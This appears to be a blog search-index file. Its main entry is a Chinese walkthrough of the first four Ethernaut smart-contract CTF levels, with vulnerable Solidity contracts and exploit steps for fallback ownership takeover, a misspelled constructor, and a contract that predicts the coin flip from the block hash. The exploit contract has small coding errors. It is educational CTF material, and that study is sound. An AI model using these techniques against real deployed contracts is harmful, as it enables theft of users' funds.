<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Ethernaut训练]]></title>
    <url>%2F2019%2F01%2F08%2Fethernautd%E8%AE%AD%E7%BB%83%2F</url>
    <content type="text"><![CDATA[简介ethernaut包含有22道智能合约的训练题目，而最近有关智能合约的题也是在不断的出现，所以还是有必要了解一下的(顺便了解下这种题目怎么做) 题目链接 另外也放上大哥的writeup跟着学习一下链接 level 0 - Hello Ethernaut题目链接 第一步首先是简单的教程，先下载MetaMask插件并且注册账号，然后设置钱包并使用Ropsten测试网络 第二步打开控制台，然后会发现给了合约地址和help 其中level地址为 0xdf51a9e8ce57e7787e4a27dd19880fd7106b9a5c在Ropsten测试网络下还会有你的player地址和Ethernaut地址使用player指令可以直接获得player地址 第三步之后会让你使用getBalance函数获得你的以太坊的数量，并且让你使用help(),由于我们第二步使用过，就不再演示了PS:由于在Ropsten测试网络中可以直接通过Ether Faucet获得测试以太坊，所以我的数额为7 第四步使用ethernaut指令可以直接输出当前合约的有关信息，其中的abi可以理解为合约中的公共方法列表，当然在下面可以看见例如owner: f()之类的东西就是方法的具体信息 第五步与ABI互动，也就是可以调用上一步说的方法列表里的方法，系统让我们调用ethernaut.owner()，返回的是智能合约的拥有者 第六步这一步就是让我们通过上面提到的Ether Faucet获得测试以太坊，可以将MetaMask调至中文，然后点击存入-测试水管，之后点击request 1 ether from faucet就行 第七步生成合约实例，点击下面的蓝色按钮即可，需要等待一段时间 成功之后会显示下图 第八步题目告诉你生成的合约实例可以调用合约的ABI，也可以自己试试，用contract.方法就行 第九步从contract.info()入手跟着走下去就行 之后点击submit instance即可过关。 level 1 - Fallback题目链接 胜利条件1.获得合约的所有权2.收回合约的所有余额 tips1.如何用ABI发送ether2.如何用ABI以外的方法发送ether3.查看help()会有帮助4.Fallback方法 源码123456789101112131415161718192021222324252627282930313233pragma solidity ^0.4.18;import 'zeppelin-solidity/contracts/ownership/Ownable.sol';contract Fallback is Ownable &#123; mapping(address =&gt; uint) public contributions; function Fallback() public &#123; //构造函数，初始化owner的contributions为1000 contributions[msg.sender] = 1000 * (1 ether); &#125; function contribute() public payable &#123; //将合约拥有权交给贡献1000ETH以上的人 require(msg.value &lt; 0.001 ether); contributions[msg.sender] += msg.value; if(contributions[msg.sender] &gt; contributions[owner]) &#123; owner = msg.sender; &#125; &#125; function getContribution() public view returns (uint) &#123; //查询contribution return contributions[msg.sender]; &#125; function withdraw() public onlyOwner &#123; //owner收回合约的所有余额，只有owner可以调用 owner.transfer(this.balance); &#125; function() payable public &#123; //fallback函数，当满足发送的value大于1并且发送者的contributions的值大于1时将owner变为消息发送者 require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0); owner = msg.sender; &#125;&#125; FallBack函数回退函数(fallback function)1.每一个合约有且仅有一个没有名字的函数。这个函数无参数，也无返回值。如果调用合约时，没有匹配上任何一个函数(或者没有传哪怕一点数据)，就会调用默认的回退函数。 2.此外，当合约收到ether时（没有任何其它数据），这个函数也会被执行。在此时，一般仅有少量的gas剩余，用于执行这个函数(准确的说，还剩2300gas)。所以应该尽量保证回退函数使用少的gas。 我们在这里要用到的就是第二点 解题思路最终目的是调用withdraw()方法将余额清零，也就是我们要成为ownercontribute里面虽然有可能称为owner，但是代价太过昂贵（1000ETH且每次只能发送小于0.001的ETH）在fallback中只要满足msg.value&gt;0且contributions[msg.sender]&gt;0即可成为owner其中msg.value我们可以直接发送过去，而contributions[msg.sender]我们需要调用contribute()这个函数，也就是参数满足value&lt;0.001的条件就行 具体步骤1.调用contribute函数，传入参数value=1其中value的单位是wei 11 eth = 1e9 Gwei = 1e18 wei 2.调用send函数，传入参数1(也可以在钱包里直接打钱，不过听说打钱会有bug，就直接用send了，当然也可以用contract.sendTransaction({value: 100}))， 由于send函数会调用fallback函数，我们便成为了owner 3.调用withdraw函数，将钱卷走 4.点击submit instance即可过关。 注意事项绝对不要操作太快了，每一步传值的时候都要等到右下弹出提示再继续,否则可能和我一样一个账号40多条操作在排队，过了一个小时都没反应,只能再开一个账号(:зゝ∠) level 2 - Fallout题目链接 胜利条件1.获得合约的所有权 tips1.Solidity Remix IDE 源码12345678910111213141516171819202122232425262728293031pragma solidity ^0.4.18;import 'zeppelin-solidity/contracts/ownership/Ownable.sol';contract Fallout is Ownable &#123; mapping (address =&gt; uint) allocations; /* constructor */ function Fal1out() public payable &#123; owner = msg.sender; allocations[owner] = msg.value; &#125; function allocate() public payable &#123; allocations[msg.sender] += msg.value; &#125; function sendAllocation(address allocator) public &#123; require(allocations[allocator] &gt; 0); allocator.transfer(allocations[allocator]); &#125; function collectAllocations() public onlyOwner &#123; msg.sender.transfer(this.balance); &#125; function allocatorBalance(address allocator) public view returns (uint) &#123; return allocations[allocator]; &#125;&#125; 解题思路可以看出函数的构造函数写错了，Fallout写成了Fal1out，变为了谁都可以调用的函数(我们无法调用构造函数)。所以我们可以调用构造函数成为owner，然后再调用collectAllocations取钱 具体步骤1.调用Fal1out函数，成为owner 2.调用collectAllocations函数，将钱卷走 3.点击submit instance即可过关。 level 3 - Coin Flip题目链接 胜利条件1.猜抛硬币的结果，连续猜对十次即可获胜 源码12345678910111213141516171819202122232425262728293031pragma solidity ^0.4.18;contract CoinFlip &#123; uint256 public consecutiveWins; uint256 lastHash; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; function CoinFlip() public &#123; consecutiveWins = 0; &#125; function flip(bool _guess) public returns (bool) &#123; uint256 blockValue = uint256(block.blockhash(block.number-1)); if (lastHash == blockValue) &#123; revert(); &#125; lastHash = blockValue; uint256 coinFlip = blockValue / FACTOR; bool side = coinFlip == 1 ? true : false; if (side == _guess) &#123; consecutiveWins++; return true; &#125; else &#123; consecutiveWins = 0; return false; &#125; &#125;&#125; 预备知识1.revert()这行代码：if(msg.sender != owner) { throw; }完全等价于如下三种形式：if(msg.sender != owner) { revert(); }assert(msg.sender == owner);require(msg.sender == owner); 解题思路1.从随机数逻辑生成来看，主要有三个步骤 a.获取上一个块的hash b.判断hash是否和上一次的hash相同，相同则回退 c.根据blockValue/FACTOR的结果判断硬币正负 2.我们每次产生的随机数和前一块的hash有关，只需要编写合约进行同步计算即可 具体步骤1.编写exp合约1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556pragma solidity ^0.4.18;contract CoinFlip &#123; uint256 public consecutiveWins; uint256 lastHash; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; function CoinFlip() public &#123; consecutiveWins = 0; &#125; function flip(bool _guess) public returns (bool) &#123; uint256 blockValue = uint256(block.blockhash(block.number-1)); if (lastHash == blockValue) &#123; revert(); &#125; lastHash = blockValue; uint256 coinFlip = blockValue / FACTOR; bool side = coinFlip == 1 ? true : false; if (side == _guess) &#123; consecutiveWins++; return true; &#125; else &#123; consecutiveWins = 0; return false; &#125; &#125;&#125;contract exp&#123; CoinFlip C; uint256 lastHash; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968 function setCoinflip(address _addr) public &#123; C = CoinFlip(_addr); &#125; function hack() public OwnerOnly &#123; uint256 blockValue = uint256(block.blockhash(block.number-1)); if (lastHash == blockValue) &#123; revert(); &#125; lastHash = blockValue; uint256 coinFlip = blockValue / FACTOR; bool side = coinFlip == 1 ? true : false; C.flip(side); &#125;&#125; 2.部署在remix上并运行hack方法十次 3.通过命令contract.consecutiveWins()可查询猜对的次数 4.当猜对的次数为10次以上之后，点击submit instance即可过关。]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2F2019%2F01%2F08%2Fhello-world%2F</url>
    <content type="text"><![CDATA[Start这个博客主要用来记录一些有关ctf的知识因为自己太健忘了，不记录下会出事的而且搭个博客以后AWD就不用再坐着发呆了，起码有点东西可以看本博客主要分为web和crypto两个方向，也是我现在负责的两个方向希望自己多多加油吧！最后来个常规操作 1$ ehco "Hello world"]]></content>
      <categories>
        <category>其他</category>
      </categories>
      <tags>
        <tag>其他</tag>
      </tags>
  </entry>
</search>
